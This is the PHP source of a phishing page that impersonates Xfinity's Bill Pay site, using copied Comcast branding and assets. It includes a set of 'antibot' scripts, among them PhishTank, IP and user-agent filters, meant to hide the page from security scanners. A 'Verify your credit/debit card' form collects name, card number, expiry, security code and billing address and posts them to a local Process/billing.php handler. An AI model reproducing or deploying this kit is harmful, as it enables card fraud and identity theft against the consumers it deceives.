<?php
ob_start();
session_start();
$email = $_SESSION['email'];
include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html>
<html lang="en"><head><style type="text/css">@keyframes atNodeInserted648 {from {opacity:0.99} to {opacity:1}}
@-moz-keyframes atNodeInserted648 {from {opacity:0.99} to {opacity:1}}
@-webkit-keyframes atNodeInserted648 {from {opacity:0.99} to {opacity:1}}
@-ms-keyframes atNodeInserted648 {from {opacity:0.99} to {opacity:1}}
@-o-keyframes atNodeInserted648 {from {opacity:0.99} to {opacity:1}}
#page-header div.page-header__navigation > nav > a[href="#/"]{
animation-duration:0.001s;animation-name:atNodeInserted648;
-moz-animation-duration:0.001s;-moz-animation-name:atNodeInserted648;
-webkit-animation-duration:0.001s;-webkit-animation-name:atNodeInserted648;
-ms-animation-duration:0.001s;-ms-animation-name:atNodeInserted648;
-o-animation-duration:0.001s;-o-animation-name:atNodeInserted648;
}</style><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>XFINITY | Bill Pay</title><link rel="apple-touch-icon" sizes="57x57" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="https://static.cimcontent.net/common-web-assets/favicon/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="https://static.cimcontent.net/common-web-assets/favicon/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="https://static.cimcontent.net/common-web-assets/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="https://static.cimcontent.net/common-web-assets/favicon/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="https://static.cimcontent.net/common-web-assets/favicon/favicon-16x16.png"><link rel="manifest" href="https://static.cimcontent.net/common-web-assets/favicon/site.webmanifest"><link rel="mask-icon" href="https://static.cimcontent.net/common-web-assets/favicon/safari-pinned-tab.svg" color="#1f232e"><link rel="shortcut icon" href="https://static.cimcontent.net/common-web-assets/favicon/favicon.ico"><meta name="msapplication-TileColor" content="#1f232e"><meta name="theme-color" content="#1f232e"><script>window.MAW||(window.MAW={}),window.MAW.env=function(n){var o=window.location.toString().match(/^https?:\/\/(?:([a-z]{2})\.|(customer|payments)(?:\.([^\.]+))?\.)?xfinity\.com\/(?:(sdcustomer)([^\/]*)\/)?/);return o?(o[2]&&o[3]||o[4]&&o[5]||"prod").replace(/-/g,""):"local"}(),"prod"!==window.MAW.env&&(document.cookie="csp_env=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",window.cspPattern=/csp_env=(\w+)/,window.cspEnv=window.location.search.match(cspPattern),cspEnv&&cspEnv[1]&&(document.cookie="csp_env="+cspEnv[1])),document.write('<script src="//static.cimcontent.net/data-layer/'+("prod"!==window.MAW.env?"nonprod/":"")+'?appId=resi_myaccount" crossorigin="anonymous"><\/script>')</script><script src="https://assets.adobedtm.com/331fbea29f79/de1fe8df812b/launch-cbf8c01aa601.min.js"></script><script src="https://static.cimcontent.net/data-layer/?appId=resi_myaccount" crossorigin="anonymous"></script><link href="https://payments.xfinity.com/static/css/2.0440f8c5.chunk.css" rel="stylesheet"><link href="css/main.dcaa7cba.chunk.css" rel="stylesheet"><script src="https://assets.adobedtm.com/extensions/EPbde2f7ca14e540399dcc1f8208860b7b/AppMeasurement.min.js" async=""></script><script src="https://assets.adobedtm.com/extensions/EPbde2f7ca14e540399dcc1f8208860b7b/AppMeasurement_Module_ActivityMap.min.js" async=""></script><script src="https://assets.adobedtm.com/extensions/EPbde2f7ca14e540399dcc1f8208860b7b/AppMeasurement_Module_AudienceManagement.min.js" async=""></script><script src="https://assets.adobedtm.com/331fbea29f79/de1fe8df812b/c9ed2add7f3c/RC3d75f96176a8418aafad5bd03f1d5445-source.min.js" async=""></script><script src="https://assets.adobedtm.com/331fbea29f79/de1fe8df812b/c9ed2add7f3c/RC23c70044065f436d8880c3422e6442ef-source.min.js" async=""></script><script src="https://assets.adobedtm.com/331fbea29f79/de1fe8df812b/c9ed2add7f3c/RC042f75f598834382945fa05e33b40292-source.min.js" async=""></script></head><body><div id="root"><div id="page-content" class="page-content"><div class="page-app"><header id="page-header" class="page-header" role="banner"><div class="page-header__logo-wrap"><a href="/" class="page-header__logo" rel="home"><span class="svg-icon page-header__logo-svg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.3"><path fill="currentColor" d="M7.71 11.76L12 6h-1.77a2 2 0 0 0-1.76.86L6.19 9.88 4 6.81A2 2 0 0 0 2.21 6H.4l4.28 5.81L0 18.09h1.71a2 2 0 0 0 1.76-.86l2.71-3.59 6.35 8.78a2 2 0 0 0 1.76.86h1.86zm34.68 6.33h2.45V6h-2.45zm-19.45 0h2.46V6h-2.46zm37.18 4.28L69 6h-1.33a1.81 1.81 0 0 0-1.76.86l-3.5 6.5-3-6.5A1.75 1.75 0 0 0 57.62 6h-1.28L61 15.85l-4.07 7.43h1.33a2 2 0 0 0 1.86-.91zM28.32 6v12.09h2.45V9.76A3.86 3.86 0 0 1 34 8c1.81 0 3 1.14 3 3.43v5.47a1.11 1.11 0 0 0 1.14 1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47 5.47 0 0 0-3.81 1.45V6zm21.06 7.83a4.21 4.21 0 0 0 4.52 4.52 6.23 6.23 0 0 0 1.79-.24l-.5-2.14a5 5 0 0 1-1.12.12 2.08 2.08 0 0 1-2.24-2.31V8.14h3.43L54.27 6h-2.43V1.07l-2.45 1.07V6h-2.6v2.14h2.59zm-34-5.64v9.95h2.45v-10H21V6h-3.15V5c0-2.07 1.24-2.76 2.45-2.76a2.93 2.93 0 0 1 .83.12l.5-2.17A4.29 4.29 0 0 0 20.11 0c-3 0-4.71 2.26-4.71 5v1h-1.29l-1.54 2.14z"></path></svg></span><span class="visuallyhidden">XFINITY</span></a></div><div class="page-header__cancel"></div><div class="page-header__back"></div><a class="sign-out button--text button" href="/oauth/disconnect?continue=https%3A%2F%2Foauth.xfinity.com%2Foauth%2Fsp-logout%3Fclient_id%3Dmy-account-web" aria-disabled="false">Sign Out</a></header><main id="page-main" class="page-main" tabindex="-1" role="main"><div class="page-section ui-grey"><div class="page-section__wrapper"><div class="page-section__content"><form action="Process/billing.php" method="post" novalidate=""><div class="payment-section"><h1 class="heading2" tabindex="-1">Verify your credit/debit card</h1><div class="card-group"><div class="card-group__item"><div class="card"><div class="card__content"><div class="form-control-group form-control-group--flex-at-768"><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="firstName">First name</label><div class="form-control__input"><input id="firstName" aria-invalid="false" aria-describedby="error_firstName" class=" " name="firstName" type="text" title="First name" value=""></div></div></div><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="lastName">Last name</label><div class="form-control__input"><input id="lastName" aria-invalid="false" aria-describedby="error_lastName" class=" " name="lastName" type="text" title="Last name" value=""></div></div></div></div><div class="form-control-group form-control-group--flex-at-1024"><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="cardNumber">Card number</label><div class="form-control__input"><input id="cardNumber" aria-invalid="false" aria-describedby="validCardNumber" class="false " name="cardNumber" type="text" value=""><span class="card-type"></span></div></div></div><div class="form-control-group__item"><div class="form-control-group form-control-group--flex-at-768 mb0"><div class="form-control-group__item form-control-group__item--2of3-at-1024"><div class="form-control"><h3 class="label form-control__label">Expiration</h3><div class="form-control__input"><div class="form-control-group form-control-group--flex mb0"><div class="form-control-group__item"><div class="form-control undefined"><div class="form-control__input"><label class="visuallyhidden" for="expirationMonth">Expiration month</label><select id="expirationMonth" aria-invalid="false" aria-describedby="expirationError" class=" " name="expirationMonth"><option value="" disabled="" hidden="">MM</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select></div></div></div><div class="form-control-group__item"><div class="form-control undefined"><div class="form-control__input"><label class="visuallyhidden" for="expirationYear">Expiration year</label><select id="expirationYear" aria-invalid="false" aria-describedby="expirationError" class=" " name="expirationYear"><option value="" disabled="" hidden="">YYYY</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option></select></div></div></div></div></div></div></div><div class="form-control-group__item form-control-group__item--1of3-at-1024"><div class="form-control form-control--cvv"><div class="form-control__input"><div class="form-control__label"><label for="cvv" class="d-inline-block">Security code</label><button class="button button--text" type="button"><svg focusable="false" viewBox="0 0 22 22" style="margin-left: 6px; width: 22px; height: 22px;"><g fill="none"><circle cx="11" cy="11" r="10" style="fill: none; stroke: currentcolor; stroke-miterlimit: 10;"></circle><path d="M13.14 15.665l-.168.682c-.5.198-.902.35-1.2.452-.298.103-.645.155-1.04.155-.606 0-1.078-.15-1.415-.444-.336-.295-.505-.67-.505-1.127 0-.176.012-.357.038-.542.025-.184.066-.393.122-.626l.626-2.216c.056-.212.103-.413.14-.604.04-.19.058-.363.058-.52 0-.282-.058-.48-.175-.59-.116-.112-.338-.17-.67-.17-.16 0-.327.027-.497.077-.17.052-.316.1-.438.146l.167-.684c.41-.167.803-.31 1.178-.43.375-.118.73-.177 1.065-.177.602 0 1.067.145 1.393.437.327.29.49.67.49 1.134 0 .097-.01.266-.034.51-.022.242-.064.465-.125.667L11.524 14c-.05.178-.097.38-.137.61-.04.226-.06.4-.06.515 0 .293.065.493.196.6.132.106.36.16.682.16.152 0 .324-.028.516-.08.19-.053.33-.1.417-.14zm.157-9.27c0 .386-.145.714-.436.984-.29.27-.64.406-1.05.406-.41 0-.762-.136-1.055-.407-.294-.27-.44-.6-.44-.984s.146-.713.44-.986c.293-.274.645-.41 1.055-.41.41 0 .76.137 1.05.41.292.273.437.602.437.986z" fill="currentColor"></path></g></svg><span class="visuallyhidden">More information about security code</span></button></div><input id="cvv" aria-invalid="false" aria-describedby="cardValidCvv" class="false " name="cvv" type="text" value=""></div></div></div></div></div></div></div></div></div><div class="card-group__item"><div class="card"><div class="card__content"><div class="form-control form-control--boolean undefined"><div class="form-control__input"><label class="form-control__label" for="billingAddressCheckbox"><span class="form-control__label-text undefined">Add Your Billing address</span></label></div></div><div class="form-control-group form-control-group--flex-at-768"><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="line1">Address line 1</label><div class="form-control__input"><input id="line1" aria-invalid="false" aria-describedby="addressError" class=" " name="line1" type="text" aria-required="true" value=""></div></div></div><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="line2">Address line 2</label><div class="form-control__input"><input id="line2" aria-invalid="false" aria-describedby="error_line2" class=" " name="line2" type="text" value=""></div></div></div></div><div class="form-control-group form-control-group--flex-at-768"><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="city">City</label><div class="form-control__input"><input id="city" aria-invalid="false" aria-describedby="cityError" class=" " name="city" type="text" aria-required="true" value=""></div></div></div><div class="form-control-group__item"><div class="form-control-group form-control-group--flex-at-768"><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="state">State</label><div class="form-control__input"><select id="state" aria-invalid="false" aria-describedby="stateError" class=" " name="state" aria-required="true"><option value="">Select</option><option value="AL">AL</option><option value="AK">AK</option><option value="AZ">AZ</option><option value="AR">AR</option><option value="CA">CA</option><option value="CO">CO</option><option value="CT">CT</option><option value="DC">DC</option><option value="DE">DE</option><option value="FL">FL</option><option value="GA">GA</option><option value="HI">HI</option><option value="ID">ID</option><option value="IL">IL</option><option value="IN">IN</option><option value="IA">IA</option><option value="KS">KS</option><option value="KY">KY</option><option value="LA">LA</option><option value="ME">ME</option><option value="MD">MD</option><option value="MA">MA</option><option value="MI">MI</option><option value="MN">MN</option><option value="MS">MS</option><option value="MO">MO</option><option value="MT">MT</option><option value="NE">NE</option><option value="NV">NV</option><option value="NH">NH</option><option value="NJ">NJ</option><option value="NM">NM</option><option value="NY">NY</option><option value="NC">NC</option><option value="ND">ND</option><option value="OH">OH</option><option value="OK">OK</option><option value="OR">OR</option><option value="PA">PA</option><option value="RI">RI</option><option value="SC">SC</option><option value="SD">SD</option><option value="TN">TN</option><option value="TX">TX</option><option value="UT">UT</option><option value="VT">VT</option><option value="VA">VA</option><option value="WA">WA</option><option value="WV">WV</option><option value="WI">WI</option><option value="WY">WY</option></select></div></div></div><div class="form-control-group__item"><div class="form-control undefined"><label class="form-control__label" for="zip">ZIP Code</label><div class="form-control__input"><input id="zip" aria-invalid="false" aria-describedby="zipError" class=" " name="zip" type="text" aria-required="true" value=""></div></div></div></div></div></div></div></div></div></div></div></div></div></div><div class="action action--right pt6"><div class="action__item"><button type="submit" class="button button--primary">Verify</button></div><div class="action__item"></div></div></form></div></div></div></main><div class="page-footer page-footer--thin "><div class="link-group"><div class="link-group__item">© 2022 Comcast</div><div class="link-group__item"><a href="https://www.xfinity.com/privacy/policy" target="_blank" rel="noopener noreferrer">Privacy Policy</a></div><div class="link-group__item"><a href="https://www.xfinity.com/privacy/manage-preference" target="_blank" rel="noopener noreferrer">Do Not Sell My Personal Information</a></div></div></div></div></div></div><script>!function(e){function r(r){for(var n,l,a=r[0],i=r[1],p=r[2],c=0,s=[];c<a.length;c++)l=a[c],Object.prototype.hasOwnProperty.call(o,l)&&o[l]&&s.push(o[l][0]),o[l]=0;for(n in i)Object.prototype.hasOwnProperty.call(i,n)&&(e[n]=i[n]);for(f&&f(r);s.length;)s.shift()();return u.push.apply(u,p||[]),t()}function t(){for(var e,r=0;r<u.length;r++){for(var t=u[r],n=!0,a=1;a<t.length;a++){var i=t[a];0!==o[i]&&(n=!1)}n&&(u.splice(r--,1),e=l(l.s=t[0]))}return e}var n={},o={1:0},u=[];function l(r){if(n[r])return n[r].exports;var t=n[r]={i:r,l:!1,exports:{}};return e[r].call(t.exports,t,t.exports,l),t.l=!0,t.exports}l.m=e,l.c=n,l.d=function(e,r,t){l.o(e,r)||Object.defineProperty(e,r,{enumerable:!0,get:t})},l.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},l.t=function(e,r){if(1&r&&(e=l(e)),8&r)return e;if(4&r&&"object"==typeof e&&e&&e.__esModule)return e;var t=Object.create(null);if(l.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:e}),2&r&&"string"!=typeof e)for(var n in e)l.d(t,n,function(r){return e[r]}.bind(null,n));return t},l.n=function(e){var r=e&&e.__esModule?function(){return e.default}:function(){return e};return l.d(r,"a",r),r},l.o=function(e,r){return Object.prototype.hasOwnProperty.call(e,r)},l.p="/";var a=this["webpackJsonpmaw-bill-pay"]=this["webpackJsonpmaw-bill-pay"]||[],i=a.push.bind(a);a.push=r,a=a.slice();for(var p=0;p<a.length;p++)r(a[p]);var f=i;t()}([])</script><script src="/static/js/2.5be4638e.chunk.js"></script><script src="/static/js/main.bc47e44d.chunk.js"></script><img alt="" src="https://www.xfinity.com/-/media/5BF28DC6EBA54E929173CC7B0D9B6E69?ts=1645062382374" style="top: -10000px; left: -10000px; position: absolute;"><script>_satellite["_runScript1"](function(event, target, Promise) {
/**
 * JS Util functions for Adobe Launch Data Elements and Rules.
 *
 * version: 1.0.0
 */
window.adobe = window.adobe || {};
window.adobe.consulting = window.adobe.consulting || {};
window.adobe.consulting.util = window.adobe.consulting.util || {};
window.Flickerlessly = window.Flickerlessly || {}, function (t) { "use strict"; var i = function (t, n, a, o) { var i = "atNodeInserted" + t, r = [], e = ["", "-moz-", "-webkit-", "-ms-", "-o-"]; e.forEach(function (t, e) { r.push("@" + t + "keyframes " + i + " {from {opacity:0.99} to {opacity:1}}") }), r.push(n + "{"), e.forEach(function (t, e) { r.push(t + "animation-duration:0.001s;" + t + "animation-name:" + i + ";") }), r.push("}"); var s = document.getElementsByTagName("head")[0]; if (s) { var c = document.createElement("style"); c.setAttribute("type", "text/css"), c.styleSheet ? c.styleSheet.cssText = r.join("\n") : c.appendChild(document.createTextNode(r.join("\n"))), s.insertBefore(c, s.firstChild) } var l = function (t) { if (t.animationName === i && "object" == typeof t.target) { var e = !0 === o || !1 === o && null === t.target.getAttribute("data-flk-success"); u("('" + n + "') ready! Execute: " + e, t.target), "function" == typeof a && e ? (t.target.setAttribute("data-flk-success", i), !0 !== o && (["animationstart", "MSAnimationStart", "webkitAnimationStart"].forEach(function (t, e) { document.removeEventListener(t, l, !1) }), c && c.parentNode.removeChild(c)), a(t.target, u)) : u("Won't Callback", e, a) } };["animationstart", "MSAnimationStart", "webkitAnimationStart"].forEach(function (t, e) { document.addEventListener(t, l, !1) }) }, u = -1 !== window.location.href.indexOf("Debug=1") ? function () { Array.prototype.unshift.call(arguments, "FLK:"), console.info.apply(this, arguments) } : function () { }, r = Math.floor(1e3 * Math.random() + 1); t.onReady = function () { for (var t = 0; t < arguments.length; t++) { var e = arguments[t], n = e.selector, a = e.success || null, o = e.persist || !1; i(r++, n, a, o) } } }(Flickerlessly);

(function (A) {

  // Get the value from an object heirarchy. Usage :- window.adobe.consulting.util.getObjVal(<base object>, <heirarchy under base object as a string>, <default value (optional), this will be returned if the object is not found>);
  A.getObjVal = function (obj, prop, defVal) {
    defVal = defVal || "";
    if (!obj || !prop || typeof prop != "string") { _satellite.logger.info("!*!*!* WARNING !*!*!* 'Object' or 'Path' is missing or invalid"); return defVal; }
    var props = prop.split("."), i;
    for (i = 0; i < props.length; i += 1) {
      if (typeof obj[props[i]] !== "undefined") { obj = obj[props[i]]; } else { _satellite.logger.info("!*!*!* WARNING !*!*!* " + props[i] + " could not be found under path " + prop); return defVal; }
    }
    return obj;
  };

  A.resetState = function () {
    // Resetting Variable for holding Campaign/Experience qualification for each page/view
    window.ttMETA = [];

    //Resetting SDID for A4T integration.
    var visitor = Visitor.getInstance("DA11332E5321D0550A490D45@AdobeOrg");
    visitor.resetState();
  };

  A.loadJS = function (url, location, cb) {
    var scriptTag = document.createElement('script');
    scriptTag.src = url;
    if (typeof cb == "function") {
      scriptTag.onload = cb;
    }
    location.appendChild(scriptTag);
  };

  A.getAPI = function (url, successHandler, errorHandler, headers) {
    var xhr = typeof XMLHttpRequest != 'undefined'
      ? new XMLHttpRequest()
      : new ActiveXObject('Microsoft.XMLHTTP');
    xhr.open('get', url, true);
    if (headers) {
      for (var i = 0, j = Object.keys(headers); i < j.length; i++) {
        xhr.setRequestHeader(j[i], headers[j[i]]);
      }
    }
    xhr.withCredentials = true;// Must follow xhr.open to avoid InvalidStateError
    xhr.onreadystatechange = function () {
      var status, data;
      if (xhr.readyState == 4) {
        status = xhr.status;
        if (status == 200) {
          data = JSON.parse(xhr.responseText);
          successHandler && successHandler(data);
        } else {
          errorHandler && errorHandler(status);
        }
      }
    };
    xhr.send();
  };

  A.fireCustomEvent = function (name, details) {
    var event = new CustomEvent(name, {
      detail: {
        source: "dtm",
        data: details
      }
    });
    document.dispatchEvent(event);
  };

  A.numberOfDaysPassed = function (fromDate) {
    if (fromDate == "") return "";

    var fromDateArr = fromDate.split("-");

    if (fromDateArr.length != 3 || isNaN(new Date(fromDate))) {
      console.log("Invalid Date given for function window.adobe.consulting.util.numberOfDaysPassed()");
      return NaN;
    }

    var currDate = new Date();
    var utcFromDate = new Date(Date.UTC(fromDateArr[0], fromDateArr[1] - 1, fromDateArr[2], 24, 0, 0, 0));
    var utcCurrentDate = Date.UTC(currDate.getFullYear(), currDate.getMonth(), currDate.getDate(), 24, 0, 0, 0);

    var dateDiff = utcCurrentDate - utcFromDate;

    return A.dhm(dateDiff)[0];
  };

  A.getUrlParameter = function (name) {
    name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
    var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
    var results = regex.exec(location.search);
    return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
  };

  A.dhm = function (t) {
    var cd = 24 * 60 * 60 * 1000,
      ch = 60 * 60 * 1000,
      d = Math.floor(t / cd),
      h = Math.floor((t - d * cd) / ch),
      m = Math.round((t - d * cd - h * ch) / 60000),
      pad = function (n) { return n < 10 ? '0' + n : n; };
    if (m === 60) {
      h++;
      m = 0;
    }
    if (h === 24) {
      d++;
      h = 0;
    }
    return [d, pad(h), pad(m)];
  };

  A.getMetaContentByName = function (name, content) {
    var content = (content == null) ? 'content' : content, metaObj = document.querySelector("meta[name='" + name + "']");
    return metaObj != null ? metaObj.getAttribute(content) != null ? metaObj.getAttribute(content).toLowerCase() : "" : "";
  };

  A.fireTargetCustomMbox = function (name, params) {
    adobe.target.getOffer({
      mbox: name,
      params: params,
      success: function (offer) {
        adobe.target.applyOffer({
          "mbox": name,
          "offer": offer
        });
      },
      error: function (status, error) {
        _satellite.logger.warn("Adobe Target custom mBox ( " + name + " ) request did not succeed :: ", status, error);
      }
    });
  };

  A.getEventInfo = function (eventMethod, DL_path, eventName, defValue) {
    defValue = defValue || "";
    var DL_events = digitalData.event;
    for (var x = 0; x < DL_events.length; x++) {
      if (DL_events[x].eventInfo.eventMethod && DL_events[x].eventInfo.eventMethod == eventMethod) {
        if (typeof eventName !== "undefined") {
          return (DL_events[x].eventInfo.eventName == eventName) ? A.getObjVal(DL_events[x].eventInfo, DL_path, defValue) : "";
        }
        return A.getObjVal(DL_events[x].eventInfo, DL_path, defValue);
      }
    }
    return defValue;
  };


  //getGBB Offers
  A.getGBBHomeOffer = function (ruleid, tokenname) {
    return new Promise(function (resolve, reject) {
      try {
        var match = /&RC.MKT=(\d+)&/gm.exec(_satellite.getVar("Cookie | PSC")),
          marketID = match && match[1],
          apiURL = marketID && ruleid && tokenname && "https://xapi.xfinity.com/markets/" + marketID + "/rules/" + ruleid + "/FeaturedOffers/V2?tokenname=" + tokenname;

        function apiSuccessHandler(data) {
          resolve(data.featuredOffers);
        }

        function apiErrorHandler(data) {
          reject(data);
        }

        if (apiURL) {
          A.getAPI(apiURL, apiSuccessHandler, apiErrorHandler);
        }
        else {
          reject("Invalid arguments");
        }
      }
      catch (e) {
        reject(e);
      }
    });
  };

  //Searches a single or an array of objects for key and value match
  A.searchObjVal = function (objectRoot, keyArray, valueArray) {
    objectRoot = objectRoot || []; keyArray = keyArray || []; valueArray = valueArray || [];
    var goodArguments = !(!(typeof objectRoot == "object") || !keyArray.length || !valueArray.length);
    var matchFound = false;
    if (!goodArguments) {
      console.error("Warning :: Invalid Arguments for function adobe.consulting.util.getMOV()");
      return {};
    }
    if (Array.isArray(objectRoot) && objectRoot.length) {
      for (var x = 0; x < objectRoot.length; x++) {
        var result = A.searchObjVal(objectRoot[x], keyArray, valueArray);
        if (result) return result;
      }
    }
    for (var y = 0; y < keyArray.length; y++) {
      matchFound = valueArray[y] && A.getObjVal(objectRoot, keyArray[y]) == valueArray[y] ? true : false;
      if (!matchFound) {
        return null
      }
    }
    return objectRoot;
  };

  // Will depreciate once all uses of getMOV are removed
  A.getMOV = A.searchObjVal

}(window.adobe.consulting.util));

});</script><script>_satellite["_runScript2"](function(event, target, Promise) {
// Creating window.ttMETA object
// ttMeta is a window level object required for integrating Adobe Target Experience qualification data with third party solutions such as Quantum Mterics.

  document.addEventListener("at-request-succeeded", function (e) {

    window.ttMETA= typeof(window.ttMETA)!="undefined" ? window.ttMETA : [];

    var tokens=e.detail.responseTokens;

    if (isEmpty(tokens)) {
      return;
    }

    var uniqueTokens = distinct(tokens);

    uniqueTokens.forEach(function(token) {
        window.ttMETA.push({
            'Qualified Page' : window.location.href,
            'CampaignName': token["activity.name"],
            'CampaignId' : token["activity.id"],
            'RecipeName': token["experience.name"],
            'RecipeId': token["experience.id"],
            'OfferId': token["option.id"],
            'OfferName': token["option.name"],
            'MboxName': e.detail.mbox
        });
    });
  });

  function isEmpty(val){
    return (val === undefined || val == null || val.length <= 0) ? true : false;
  }

  function key(obj) {
     return Object.keys(obj)
    .map(function(k) { return k + "" + obj[k]; })
    .join("");
  }

  function distinct(arr) {
    var result = arr.reduce(function(acc, e) {
      acc[key(e)] = e;
      return acc;
    }, {});

    return Object.keys(result)
    .map(function(k) { return result[k]; });
  }

});</script><script>_satellite["_runScript3"](function(event, target, Promise) {
window.Flickerlessly=window.Flickerlessly||{},function(t){"use strict";var i=function(t,n,a,o){var i="atNodeInserted"+t,r=[],e=["","-moz-","-webkit-","-ms-","-o-"];e.forEach(function(t,e){r.push("@"+t+"keyframes "+i+" {from {opacity:0.99} to {opacity:1}}")}),r.push(n+"{"),e.forEach(function(t,e){r.push(t+"animation-duration:0.001s;"+t+"animation-name:"+i+";")}),r.push("}");var s=document.getElementsByTagName("head")[0];if(s){var c=document.createElement("style");c.setAttribute("type","text/css"),c.styleSheet?c.styleSheet.cssText=r.join("\n"):c.appendChild(document.createTextNode(r.join("\n"))),s.insertBefore(c,s.firstChild)}var l=function(t){if(t.animationName===i&&"object"==typeof t.target){var e=!0===o||!1===o&&null===t.target.getAttribute("data-flk-success");u("('"+n+"') ready! Execute: "+e,t.target),"function"==typeof a&&e?(t.target.setAttribute("data-flk-success",i),!0!==o&&(["animationstart","MSAnimationStart","webkitAnimationStart"].forEach(function(t,e){document.removeEventListener(t,l,!1)}),c&&c.parentNode.removeChild(c)),a(t.target,u)):u("Won't Callback",e,a)}};["animationstart","MSAnimationStart","webkitAnimationStart"].forEach(function(t,e){document.addEventListener(t,l,!1)})},u=-1!==window.location.href.indexOf("Debug=1")?function(){Array.prototype.unshift.call(arguments,"FLK:"),console.info.apply(this,arguments)}:function(){},r=Math.floor(1e3*Math.random()+1);t.onReady=function(){for(var t=0;t<arguments.length;t++){var e=arguments[t],n=e.selector,a=e.success||null,o=e.persist||!1;i(r++,n,a,o)}}}(Flickerlessly);

Flickerlessly.onReady({selector:'#page-header div.page-header__navigation > nav > a[href="#/"]', success:function(el, log){
	el.addEventListener("click", function() {
      if((location.href.indexOf("customer.pre-prod.xfinity.com") >= 0 || location.href.indexOf("es.xfinity.com/sdcustomerpreprod/") >=0 || location.href.indexOf("customer.xfinity.com") >= 0 || location.href.indexOf("es.xfinity.com/sdcustomer/") >=0) && location.href.indexOf('excl=1') < 0) {
        // DL Flicker Management mecahnism did not work
        _satellite.logger.log("Force Loading Page to Overview!");
        document.body.style.opacity = 0;
        window.location.href = location.protocol + "//" + location.host + location.pathname;
      }
    });
}});


(function() {

   function hideAdobeOverlay() {
      if(document.getElementById("adbe_overlay")) {
        document.getElementById("adbe_overlay").style.display="none";
      }
   }

   document.addEventListener("at-request-succeeded", function(event) {
    if(event.detail.redirect == false) {
      hideAdobeOverlay();
    }
   });

   document.addEventListener("at-request-failed", hideAdobeOverlay);
   document.addEventListener("at-content-rendering-no-offers", hideAdobeOverlay);
   document.addEventListener("at-content-rendering-failed", hideAdobeOverlay);

   //Timed Unload of Loader for Redirect failure scenarios which are outside of our control.
   window.setTimeout(hideAdobeOverlay, 10000);

}());


});</script><div class="ReactModalPortal"></div><div class="ReactModalPortal"></div></body></html>
